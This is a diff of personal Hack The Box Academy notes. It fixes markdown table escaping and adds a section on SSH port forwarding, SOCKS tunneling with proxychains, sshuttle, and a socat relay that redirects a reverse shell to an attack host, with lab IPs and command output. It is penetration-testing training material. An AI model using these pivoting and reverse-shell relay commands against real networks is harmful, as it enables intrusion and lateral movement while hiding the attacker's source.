@@ -744,8 +744,8 @@ FTP, or File Transfer Protocol, is a standard network protocol used for the tran
 | `secure_chroot_dir=/var/run/vsftpd/empty` | Name of an empty directory |
 | `pam_service_name=vsftpd` | This string is the name of the PAM service vsftpd will use. |
 | `rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem` | The last three options specify the location of the RSA certificate to use for SSL encrypted connections. |
-| `rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key` |
-| `ssl_enable=NO` |
+| `rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key` | |
+| `ssl_enable=NO` | |
 
 **Dangerous Settings**
 | Setting | Description |
@@ -975,8 +975,8 @@ An OID represents a node in a hierarchical namespace. A sequence of numbers uniq
 | Settings | Description |
 | ---------------------------------------------- | ------------------------------------------------------------------------------------- |
 | rwuser noauth | Provides access to the full OID tree without authentication. |
-| rwcommunity <community string> <IPv4 address> | Provides access to the full OID tree regardless of where the requests were sent from. |
-| rwcommunity6 <community string> <IPv6 address> | Same access as with rwcommunity with the difference of using IPv6. |
+| rwcommunity \<community string\> \<IPv4 address\> | Provides access to the full OID tree regardless of where the requests were sent from. |
+| rwcommunity6 \<community string\> \<IPv6 address\> | Same access as with rwcommunity with the difference of using IPv6. |
 
 **SNMP Tools**
 
@@ -1689,7 +1689,7 @@ Laudanum is a repository of ready-made files that can be used to inject onto a v
 | `search <name>`                                  | Search for exploits or modules within the Framework.                                                                                              |
 | `info`                                           | Load information about a specific exploit or module.                                                                                              |
 | `use <name>`                                     | Load an exploit or module (example: use windows/smb/psexec).                                                                                      |
-| `use <number>`                                   | Load an exploit by using the index number displayed after the search <name> command.                                                              |
+| `use <number>`                                   | Load an exploit by using the index number displayed after the search \<name\> command.                                                              |
 | `LHOST`                                          | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
 | `RHOST`                                          | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).                                                   |
 | `setg <function>`                                | Set a specific value globally (for example, LHOST or RHOST).                                                                                      |
@@ -2603,3 +2603,153 @@ HTB{46u$!n9_l!nk3d_$3rv3r$}
 ### Complete
 
 [Link of Completion](https://academy.hackthebox.com/achievement/713396/116)
+
+## Pivoting, Tunneling, and Port Forwarding
+
+### Dynamic Port Forwarding with SSH and SOCKS Tunneling
+
+**Executing the Local Port Forward**
+
+The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port `1234`. We can use Netstat or Nmap to query our local host on `1234` port to verify whether the MySQL service was forwarded.
+
+```sh
+woadey@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+
+ubuntu@10.129.202.64's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 24 Feb 2022 05:23:20 PM UTC
+
+  System load:             0.0
+  Usage of /:              28.4% of 13.72GB
+  Memory usage:            34%
+  Swap usage:              0%
+  Processes:               175
+  Users logged in:         1
+  IPv4 address for ens192: 10.129.202.64
+  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
+  IPv4 address for ens224: 172.16.5.129
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+66 updates can be applied immediately.
+45 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+```
+
+**Forwarding Multiple Ports**
+
+```sh
+woadey@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
+```
+
+**Enabling Dynamic Port Forwarding with SSH**
+
+The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port `9050`. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.
+
+To inform proxychains that we must use port `9050`, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there.
+
+```sh
+woadey@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
+```
+
+```sh
+woadey@htb[/htb]$ tail -4 /etc/proxychains.conf
+
+# meanwile
+# defaults set to "tor"
+socks4 127.0.0.1 9050
+```
+
+```sh
+woadey@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
+Initiating Ping Scan at 12:30
+Scanning 10 hosts [2 ports/host]
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+
+<SNIP>
+```
+
+### Remote/Reverse Port Fowarding with SSH
+
+```sh
+woadey@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+```
+
+![Reverse Port Forwarding](images/44.webp)
+
+### Socat Redirection with a Reverse Shell
+
+Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.
+
+Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.
+
+```sh
+ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+```
+
+### SSH Pivoting with Sshuttle
+
+[Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.
+
+```sh
+woadey@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+
+Starting sshuttle proxy (version 1.1.0).
+c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
+fw: Starting firewall with Python version 3.9.2
+fw: ready method name nat.
+c : IPv6 enabled: Using default IPv6 listen address ::1
+c : Method: nat
+c : IPv4: on
+c : IPv6: on
+c : UDP : off (not available with nat method)
+c : DNS : off (available)
+c : User: off (available)
+c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
+c :   (<AddressFamily.AF_INET: 2>, '172.16.5.0', 32, 0, 0)
+c : Subnets to exclude from forwarding:
+c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
+c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
+c : TCP redirector listening on ('::1', 12300, 0, 0).
+c : TCP redirector listening on ('127.0.0.1', 12300).
+c : Starting client with Python version 3.9.2
+c : Connecting to server...
+ubuntu@10.129.202.64's password: 
+ s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
+ s: latency control setting = True
+ s: auto-nets:False
+c : Connected to server.
+fw: setting up.
+fw: ip6tables -w -t nat -N sshuttle-12300
+fw: ip6tables -w -t nat -F sshuttle-12300
+fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
+fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
+fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
+fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
+fw: iptables -w -t nat -N sshuttle-12300
+fw: iptables -w -t nat -F sshuttle-12300
+fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
+fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
+fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
+fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
+fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
+```
+
+```sh
+woadey@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
+```
